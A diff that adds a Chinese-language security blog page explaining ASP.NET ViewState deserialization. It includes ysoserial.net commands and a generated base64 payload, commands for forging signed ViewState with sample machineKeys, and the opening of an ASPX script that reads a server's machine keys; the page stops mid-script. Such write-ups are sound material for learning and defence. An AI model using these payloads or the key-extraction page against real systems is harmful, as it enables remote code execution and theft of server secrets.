@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ASP.NET ViewState反序列化 - p0l1st&#39;s blog</title><meta name="author" content="p0l1st">
+<meta name="description" content="基础知识 https://www.cnblogs.com/edisontalk/p/3899123.html
+"><meta name="keywords" content='.NET ViewState'>
+  <meta itemprop="name" content="ASP.NET ViewState反序列化">
+  <meta itemprop="description" content="基础知识 https://www.cnblogs.com/edisontalk/p/3899123.html">
+  <meta itemprop="datePublished" content="2026-08-24T21:07:02+08:00">
+  <meta itemprop="dateModified" content="2026-08-24T21:07:02+08:00">
+  <meta itemprop="wordCount" content="632">
+  <meta itemprop="keywords" content=".NET ViewState"><meta property="og:url" content="https://blog.p0l1st.top/post/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="p0l1st&#39;s blog">
+  <meta property="og:title" content="ASP.NET ViewState反序列化">
+  <meta property="og:description" content="基础知识 https://www.cnblogs.com/edisontalk/p/3899123.html">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2026-08-24T21:07:02+08:00">
+    <meta property="article:modified_time" content="2026-08-24T21:07:02+08:00">
+    <meta property="article:tag" content=".NET ViewState">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ASP.NET ViewState反序列化">
+  <meta name="twitter:description" content="基础知识 https://www.cnblogs.com/edisontalk/p/3899123.html">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" type="text/html" href="https://blog.p0l1st.top/post/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="ASP.NET ViewState反序列化 - p0l1st&#39;s blog" /><link rel="prev" type="text/html" href="https://blog.p0l1st.top/post/fastjson-1.2.83-rce/" title="fastjson 1.2.83 RCE" /><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ASP.NET ViewState反序列化",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/blog.p0l1st.top\/post\/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/"
+    },"genre": "posts","keywords": ".NET ViewState","wordcount":  632 ,
+    "url": "https:\/\/blog.p0l1st.top\/post\/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/","datePublished": "2026-08-24T21:07:02+08:00","dateModified": "2026-08-24T21:07:02+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "p0l1st"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="narrow"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="p0l1st&#39;s blog"><span class="header-title-text">p0l1st&#39;s blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/">Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/">Friends</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="p0l1st&#39;s blog"><span class="header-title-text">p0l1st&#39;s blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/archives/">Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item"><a class="menu-link" href="/friends/">Friends</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ASP.NET ViewState反序列化</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603311542974.png' alt="p0l1st" height="16" width="16">&nbsp;p0l1st</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/.net/" class="post-category" title="Category - .NET"><i class="fa-regular fa-folder" aria-hidden="true"></i> .NET</a></span></div><div class="post-meta-line"><span title="published on 2026-08-24 21:07:02"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2026-08-24">2026-08-24</time></span>&nbsp;<span title="632 words"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>About 700 words</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础知识">基础知识</a></li>
+    <li><a href="#viewstate">ViewState</a></li>
+    <li><a href="#viewstate反序列化利用">ViewState反序列化利用</a>
+      <ul>
+        <li><a href="#禁用mac签名">禁用MAC签名</a></li>
+        <li><a href="#启用mac签名">启用MAC签名</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 class="heading-element" id="基础知识"><span>基础知识</span>
+  <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><a href="https://www.cnblogs.com/edisontalk/p/3899123.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/edisontalk/p/3899123.html</a></p>
+<p><a href="https://www.cnblogs.com/edisontalk/p/3901559.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/edisontalk/p/3901559.html</a></p>
+<p><a href="https://www.cnblogs.com/an-wl/archive/2011/06/26/2090615.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/an-wl/archive/2011/06/26/2090615.html</a></p>
+<h1 class="heading-element" id="viewstate"><span>ViewState</span>
+  <a href="#viewstate" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>Visual Studio搭建环境</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image-20260824205040272.png' alt="image-20260824205040272"></p>
+<p>运行后访问Default.aspx</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image-20260824205112676.png' alt="image-20260824205112676"></p>
+<p>页面中生成了 <code>__VIEWSTATE</code> 和 <code>__VIEWSTATEGENERATOR</code> 两个隐藏字段</p>
+<p>使用ViewStateDecoder解密内容</p>
+<p><img loading="lazy" src='https://cdn.nlark.com/yuque/0/2026/png/12925322/1786955237372-9c2071f7-ad86-498b-bb4b-5ccac7acb9e0.png' alt="img"></p>
+<p>这串数据是由losFormatter序列化再base64后的字符串</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-c#"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="1" style="--fi-max-shown-lines:100;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">LosFormatter</span> <span class="n">losFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">LosFormatter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">v</span> <span class="p">=</span> <span class="n">losFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="s">&#34;/wEPDwULLTExMjQxOTA3OTQPZBYCZg8PFgQeD19fQW50aVhzcmZUb2tlbgUgNzcwMTQ4NDRkYzZhNDBlMWIyZDQ5ZDg4ZmY2MjA3Y2IeEl9fQW50aVhzcmZVc2VyTmFtZWVkZGTmVHzX8u1q4dvMrcEcYs6+6IfKsQEcTL+mNFNS6pNB3Q==&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">v</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">FullName</span><span class="p">);</span></span></span></code></pre></div></div><p><img loading="lazy" src='https://cdn.nlark.com/yuque/0/2026/png/12925322/1786956773618-24b546e6-f8e6-4a73-83e7-fd74e8576a38.png' alt="img"></p>
+<p>反序列化回来可知本质是一组<code>System.Web.UI.Pair</code>对象，可以在代码中向viewstate添加键值来保存一些对象</p>
+<p>Default.aspx.cs</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-c#"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Web</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Web.UI</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Web.UI.WebControls</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">partial</span> <span class="k">class</span> <span class="nc">_Default</span> <span class="p">:</span> <span class="n">Page</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="k">void</span> <span class="n">Page_Load</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ViewState</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">,</span><span class="s">&#34;p0l1st&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>重启web服务</p>
+<p>此时</p>
+<pre tabindex="0"><code>/wEPDwULLTExMjQxOTA3OTQPFgIeBG5hbWUFBnAwbDFzdBYCZg8PFgQeD19fQW50aVhzcmZUb2tlbgUgNzk4YzgzZDhiYmFjNDczM2I2YjVlZDUxZDE2MWMxODkeEl9fQW50aVhzcmZVc2VyTmFtZWVkZGTRkQgZqVmjP9VRp2v9v7NpyvkUDTowYZDIUF5oe+Wa4g==</code></pre><p><img loading="lazy" src='https://cdn.nlark.com/yuque/0/2026/png/12925322/1786956995714-6231a5ab-88a5-4416-8ae5-dcf01a9a416c.png' alt="img"></p>
+<p>viewstate值可控会导致反序列化rce</p>
+<h1 class="heading-element" id="viewstate反序列化利用"><span>ViewState反序列化利用</span>
+  <a href="#viewstate%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="禁用mac签名"><span>禁用MAC签名</span>
+  <a href="#%e7%a6%81%e7%94%a8mac%e7%ad%be%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code>PS E:\code\ysoserial.net\ysoserial\bin\Debug&gt; .\ysoserial.exe -f losformatter -g SessionViewStateHistoryItem -c &#34;ping localhost -t&#34;
+/wEyqQsAAQAAAP////8BAAAAAAAAAAwCAAAAVFN5c3RlbS5XZWIuTW9iaWxlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYQUBAAAASVN5c3RlbS5XZWIuVUkuTW9iaWxlQ29udHJvbHMuU2Vzc2lvblZpZXdTdGF0ZStTZXNzaW9uVmlld1N0YXRlSGlzdG9yeUl0ZW0BAAAAAXMBAgAAAAYDAAAA3Akvd0V5bmdjQUFRQUFBUC8vLy84QkFBQUFBQUFBQUF3Q0FBQUFYazFwWTNKdmMyOW1kQzVRYjNkbGNsTm9aV3hzTGtWa2FYUnZjaXdnVm1WeWMybHZiajB6TGpBdU1DNHdMQ0JEZFd4MGRYSmxQVzVsZFhSeVlXd3NJRkIxWW14cFkwdGxlVlJ2YTJWdVBUTXhZbVl6T0RVMllXUXpOalJsTXpVRkFRQUFBRUpOYVdOeWIzTnZablF1Vm1semRXRnNVM1IxWkdsdkxsUmxlSFF1Um05eWJXRjBkR2x1Wnk1VVpYaDBSbTl5YldGMGRHbHVaMUoxYmxCeWIzQmxjblJwWlhNQkFBQUFEMFp2Y21WbmNtOTFibVJDY25WemFBRUNBQUFBQmdNQUFBREFCVHcvZUcxc0lIWmxjbk5wYjI0OUlqRXVNQ0lnWlc1amIyUnBibWM5SW5WMFppMHhOaUkvUGcwS1BFOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpQk5aWFJvYjJST1lXMWxQU0pUZEdGeWRDSWdTWE5KYm1sMGFXRnNURzloWkVWdVlXSnNaV1E5SWtaaGJITmxJaUI0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenB6WkQwaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM003WVhOelpXMWliSGs5VTNsemRHVnRJaUI0Yld4dWN6cDRQU0pvZEhSd09pOHZjMk5vWlcxaGN5NXRhV055YjNOdlpuUXVZMjl0TDNkcGJtWjRMekl3TURZdmVHRnRiQ0krRFFvZ0lEeFBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSXVUMkpxWldOMFNXNXpkR0Z1WTJVK0RRb2dJQ0FnUEhOa09sQnliMk5sYzNNK0RRb2dJQ0FnSUNBOGMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ0lDQWdJRHh6WkRwUWNtOWpaWE56VTNSaGNuUkpibVp2SUVGeVozVnRaVzUwY3owaUwyTWdjR2x1WnlCc2IyTmhiR2h2YzNRZ0xYUWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs=</code></pre><h2 class="heading-element" id="启用mac签名"><span>启用MAC签名</span>
+  <a href="#%e5%90%af%e7%94%a8mac%e7%ad%be%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>
+<p>.NET Framework 4.5 (4.0) 版本之前 (legacy 模式, 可忽略加密)</p>
+<ul>
+<li>
+<p>已知 validation 和 validationKey</p>
+</li>
+<li>
+<p>已知<code>__VIEWSTATEGENERATOR</code>或 apppath 和 path</p>
+</li>
+</ul>
+</li>
+<li>
+<p>.NET Framework 4.5 版本之后 (必须加密)</p>
+<ul>
+<li>
+<p>已知 <code>validation</code> 和 <code>validationKey</code></p>
+</li>
+<li>
+<p>已知 <code>decryption</code> 和 <code>decryptionKey</code></p>
+</li>
+<li>
+<p>已知 apppath 和 path (<code>__VIEWSTATEGENERATOR</code>不可用)</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>当指定了<code>ViewStateUserKey</code>时，仍需获得该属性的值才能成功构造Payload</p>
+<p>可通过GET/POST请求传递<code>_VIEWSTATE</code>参数的方式发送payload</p>
+<pre tabindex="0"><code># .NET Framework &gt;= 4.5
+# 即 machineKey 的 compatibilityMode 为 Framework45
+# 同时指定 validationKey 和 decryptionKey
+ysoserial.exe -g TextFormattingRunProperties -c &#34;calc.exe&#34; -p ViewState --validationalg=&#34;HMACSHA256&#34; --validationkey=&#34;EF1407C05ADB865C42081A561B731E8A319CE2E9797C541CD5315C1A8EFC9438&#34; --decryptionalg=&#34;Auto&#34; --decryptionkey=&#34;FAA167F315456DC99D5EE78D3228874AFDFFF581A16F0CCE060170420E52F7EB&#34; --apppath=&#34;/&#34; --path=&#34;/FirstPage.aspx&#34;
+
+# .NET Framework &lt; 4.5 (4.0)
+# 即 machineKey 的 compatibilityMode 为 Framework20SP1/Framework20SP2
+# 仅需指定 validationKey
+
+# 指定 apppath 和 path 时需要加上 --islegacy 参数
+ysoserial.exe -g TextFormattingRunProperties -c &#34;calc.exe&#34; -p ViewState --validationalg=&#34;SHA1&#34; --validationkey=&#34;70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0&#34; --apppath=&#34;/&#34; --path=&#34;/FirstPage.aspx&#34; --islegacy
+
+# 指定 generator 时无需加上 --islegacy 参数
+ysoserial.exe -g TextFormattingRunProperties -c &#34;calc.exe&#34; -p ViewState --validationalg=&#34;SHA1&#34; --validationkey=&#34;70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0&#34; --generator &#34;156D3223&#34;</code></pre><p>获取 ViewState machineKey 的脚本 (来自 RowTeam)</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-c#"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="3" style="--fi-max-shown-lines:100;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">&#34;System.Diagnostics&#34;</span> <span class="p">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">&#34;System.IO&#34;</span> <span class="p">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">script</span> <span class="n">runat</span><span class="p">=</span><span class="s">&#34;server&#34;</span> <span class="n">language</span><span class="p">=</span><span class="s">&#34;C#&#34;</span> <span class="n">CODEPAGE</span><span class="p">=</span><span class="s">&#34;65001&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">void</span> <span class="n">GetAutoMachineKeys</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">netVersion</span> <span class="p">=</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Registry</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="s">&#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NETFramework Setup\\NDP\\v4\\Full\\&#34;</span><span class="p">,</span> <span class="s">&#34;Version&#34;</span><span class="p">,</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">RegistryValueKind</span><span class="p">.</span><span class="n">ExpandString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">netVersion</span> <span class="p">!=</span> <span class="kc">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;NetVersion: &lt;/b&gt;&#34;</span> <span class="p">+</span> <span class="n">netVersion</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//==========================================================================</span>
